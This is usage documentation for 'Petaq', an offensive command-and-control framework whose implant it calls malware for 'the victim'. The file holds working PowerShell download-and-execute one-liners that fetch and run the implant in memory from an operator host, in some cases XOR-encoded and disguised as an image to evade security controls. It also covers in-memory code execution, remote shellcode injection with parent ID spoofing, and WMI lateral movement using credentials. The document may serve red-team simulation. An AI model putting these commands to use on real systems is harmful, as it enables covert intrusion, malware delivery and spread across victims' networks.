# Installation
## Information
Petaq has two components, service for the operator, and implant for the victim
* Petaq Service - The Command & Control Service (.NET Core)
* Petaq Implant - The Malware (.NET Framework)
## Configuration
You can tweak the following files to configure the C2 and malware. 
* PetaqService configuration file is Properties/launchSettings.json
* PetaqImplant configuration file is Configuration.cs
## Run
* PetaqService can run using ```dotnet run```
* PetaqImplant can be compiled with Visual Studio, ```csc``` or ```mcs```. Then copy to a location for the victim to download from that link. It's possible to use PetaqService for it as well. The PetaqImplant can be saved as index.html in PetaqService wwwroot, or an image file under wwwroot/tools.
```
csc /out:malware.exe *.cs
copy malware.exe ../PetaqService/wwwroot/index.html
copy malware.exe ../PetaqService/wwwroot/tools/malware.jpg
```

To evade most network base security controls while tranmission, it's preferred to simply XOR encode the PetaqImplant .NET assembly.  
* Download & Execute the PetaqImplant Directly
```
$m=new-object net.webclient;$m.proxy=[Net.WebRequest]::GetSystemWebProxy();$m.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$Url='https://YOURIP:YOURPORT/PetaqImplant.exe';$dba=$m.downloaddata($Url);$a=[System.Reflection.Assembly]::Load($dba); $a.EntryPoint.Invoke(0,@(,[string[]]@()))|Out-Null
```

* Download & XOR & SAVE the PetaqImplant as an Image File
```
$m=new-object net.webclient;$m.proxy=[Net.WebRequest]::GetSystemWebProxy();$m.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$Url='https://YOURIP:YOURPORT/PetaqImplant.exe';$dba=$m.downloaddata($Url); for($i=0; $i -lt $dba.count ; $i++){$dba[$i] = $dba[$i] -bxor 0x2F}; [System.IO.File]::WriteAllBytes("PetaqImplantXORed.jpg",$dba)
```

* Download & XOR & Execute the XOR Encoded PetaqImplant Image File
```
$m=new-object net.webclient;$m.proxy=[Net.WebRequest]::GetSystemWebProxy();$m.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$Url='https://YOURIP:YOURPORT/PetaqImplantXORed.jpg';$dba=$m.downloaddata($Url);for($i=0; $i -lt $dba.count ; $i++){$dba[$i] = $dba[$i] -bxor 0x2F}; $a=[System.Reflection.Assembly]::Load($dba); $a.EntryPoint.Invoke(0,@(,[string[]]@()))|Out-Null
```


# Initial Execution
## PowerShell
* Run Powershell to load PetaqImplant .NET assembly through PetaqService
```
powershell –c $m=new-object net.webclient;$m.proxy=[Net.WebRequest]::GetSystemWebProxy();$m.Proxy.Credentials=[Net.CredentialCache];$Url='http://YOURIP:YOURPORT/';$dba=$m.downloaddata($Url);$a=[System.Reflection.Assembly]::Load($dba); $a.EntryPoint.Invoke(0,@(,[string[]]@()))
```
* Run Powershell to load PetaqImplant .NET assembly XOR encoded through PetaqService
```
powershell –c $m=new-object net.webclient;$m.proxy=[Net.WebRequest]::GetSystemWebProxy();$m.Proxy.Credentials=[Net.CredentialCache];$Url='http://YOURIP:YOURPORT/PetaqImplantXORed.jpg';$dba=$m.downloaddata($Url);for($i=0; $i -lt $dba.count ; $i++){$dba[$i] = $dba[$i] -bxor 0x2F};$a=[System.Reflection.Assembly]::Load($dba); $a.EntryPoint.Invoke(0,@(,[string[]]@()))
```
## Alternative Mitre Att&ck Techniques for Execution
The following techniques can be used to deploy PetaqImplant .NET assemmbly or source through evasive executions. Some may need extra tools to embed .NET assembly to a JavaScript, some may need to add custom service code or a COM object to load the .NET assembly. Most of them highly monitored by EDRs as well as PowerShell. It's up to the operator to find an evasive way to invoke a .NET assembly, though, it would not be difficult as several Windows components/binaries/libraries natively load and run .NET assemblies. It's always a good idea to check the LOLBAS project to find a trusted Windows binary to run a .NET assembly or command indirectly.
* T1086 - PowerShell (Use PowerShell to load PetaqImplant .NET assembly from remote)
* T1121 - Regsvcs/Regasm (Run PetaqImplant.exe via Regasm, or add service code for Regsvcs)
* T1064 - Scripting (Use Dotnettojs/Cactustorch/Tikitorch to deploy PetaqImplant .NET Assembly)
* T1118 - InstallUtil (Use InstallUtil bypass to run/compile PetaqImplant .NET assembly or source)
* T1175 - Component Object Model and Distributed COM (Use a COM object to serialise PetaqImplant .NET Assembly)

# Code Execution Features
## Start a Process with Arguments
Start a process as inline or as a thread. This is mainly used for running CMD.exe commands, PowerShell scripts or running custom programs with arguments. It's easier to spot for EDRs and Sysmon like tools if the processes and arguments are monitored well. 
```
exec cmd.exe /c dir
exec powershell -c Write-Output($env:UserName)
exec whoami
```
If Petaq shouldn't wait for the process as it may take a long time, then execthread would be used to run the processess as a threat to PetaqImplant process. Downside is Petaq wouldn't be able to get the output. In future, this may be fixed with SMB Named Pipes. 
```
execthread cmd.exe /c dir
execthread powershell -c Write-Output($env:UserName)
execthread whoami
```
## Interactive C# Shell
Petaq does add a header and a footer to the given C# code, compile it in memory without touching disk, then run it and get the output. This is useful to evade EDRs and other command line monitoring tools if the operator uses .NET code instead of Windows command shells.
```
exec-sharpdirect SHARPCODE
exec-sharpdirect base64 BASE64_ENCODED_SHARPCODE
exec-sharpdirect Console.WriteLine(System.Security.Principal.WindowsIdentity.GetCurrent().Name);
exec-sharpdirect Console.WriteLine(System.Net.Dns.GetHostName());
```
## Compile and Run .NET Source Code with Arguments
Petaq is able to compile a .NET source code in memory and run with the arguments given. This may be required in case of different .NET versions required, or just evasion. 
```
exec-sharpcode url http://YOURIP:YOURPORT/Sharpcode.src Parameters
exec-sharpcode base64 BASE64_ENCODED_SHARPCODE Parameters
```
## Load and Run .NET Assembly with Arguments
Petaq is able to load a .NET assembly from a remote location to a variable, and run with the arguments given. This is mainly used for .NET tradecraft used to simulate the Mitre Att&ck TTPs.
```
exec-sharpassembly url http://YOURIP:YOURPORT/Assembly.exe Parameters
exec-sharpassembly base64 http://YOURIP:YOURPORT/Assembly.b64 Parameters
```
## Load and Run Shellcode (Parent ID spoofing and QueueUserAPC)
Petaq is able to load a shellcode from a remote location, and run it through a new process created suspended with parent ID spoofing and QueueUserAPC. This is useful to invoke other C2s or unmanaged applications
```
exec-shellcode base64 http://127.0.0.1/Shellcode.b64 ARCH64 T1
exec-shellcode base64 http://127.0.0.1/Shellcode.b64 ARCH32 T2
```

# Lateral Movement Features
## WMI Command Execution
Petaq is able to run command on remote machines through WMI process create calls. This can be used as a lateral movement method such as running the initial execution PowerShell scripts as below. 
```
lateralmovement wmiexec domain=DOMAIN username=USER password=PASSWORD host=TARGETIP command="powershell –c $m = new- object net.webclient;$Url = 'http://YOURIP:YOURPORT';$dba =$m.downloaddata($Url);$a =[System.Reflection.Assembly]::Load($dba); $a.EntryPoint.Invoke(0,@(,[string[]]@()))"
```
## Alternative Mitre Att&ck Techniques for Execution
Even though Petaq currently doesn't support any other lateral movement options internally, Windows does have enough tools to replicate the following Mitre Att&ck TTPs. In future, Petaq will have some of those techniques, especially DCOM. 
* T1175 - Component Object Model and Distributed COM
* T1021 - Remote Services
* T1077 - Windows Admin Shares
* T1028 - Windows Remote Management
* T1053 - Scheduled Task

# Implant to Implant Linking
## Running Petaq Implant as Listener
In addition to the direct Websocket connections to the C2, the Petaq implant can also link other Petaq implants on the remote network, or listen to a TCP/UDP port or SMB Named Pipe for linking. It's possible to run Petaq implant on a remote system through the Lateral Movement techniques explained above, to listen other Petaq implant connections. The following model can be used with run arguments.
```
C2 <------Websocket------>Petaq Implant<-----SMB Named Pipe----->Petaq Implant
                                       <-----TCP Port----------->Petaq Implant
                                       <-----UDP Port----------->Petaq Implant
```

Running Petaq Implant as Listener using Arguments
* Run Petaq implant to listen to the TCP port 8000
```
petaqimplant.exe tcp 8000
```
* Run Petaq implant to listen to the UDP port 8000
```
petaqimplant.exe udp 8000
```
* Run Petaq implant to listen to the SMB Named Pipe given as a parameter
```
petaqimplant.exe smb petaq_comm
```

## Linking Remote Petaq Implants
Petaq can link remote Petaq implants through the link command and URIs given. The URI needs to have the remote IP of the Petaq implant, and also the port. If SMB Named Pipe is not given, Petaq will use the default named pipe in the Configuration.cs. 
```
link tcp://REMOTEPETAQIP/8002
link udp://REMOTEPETAQIP/8002
link smb://REMOTEPETAQIP
link smb://REMOTEPETAQIP/petaq_comm
```
To remove the sessions linked (successful or failed), ```unlink SESSIONID``` can be used.

## Route and Session Information
Petaq implant can give some information about the sessions linked (successful or failed) and route information. 
In Petaq Implant, ```sessions``` and ```route``` would give information about the linked sessions. In Petaq service interface, ```route``` can also give overal routing table if there is any implant to implant linking.